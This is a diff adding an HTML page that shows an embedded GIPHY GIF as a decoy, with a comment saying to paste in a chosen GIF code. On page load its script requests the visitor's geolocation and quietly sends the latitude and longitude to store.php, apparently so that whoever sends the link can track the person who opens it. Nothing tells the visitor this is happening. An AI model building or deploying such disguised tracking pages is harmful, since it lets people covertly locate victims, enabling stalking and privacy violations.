@@ -1,0 +1,33 @@
+
+<!DOCTYPE html>
+<html>
+<body onload="getLocation()">
+ #you can pest Embed GIF coped code
+<iframe src="You'er chossing GFT url$" width="480" height="480" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="">via GIPHY</a></p>
+
+<p id="demo"></p>
+
+
+
+
+<script>
+const x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) {
+    var xhttp = new XMLHttpRequest();
+     xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
+     xhttp.send();
+}
+</script>
+
+</body>
+</html>
+
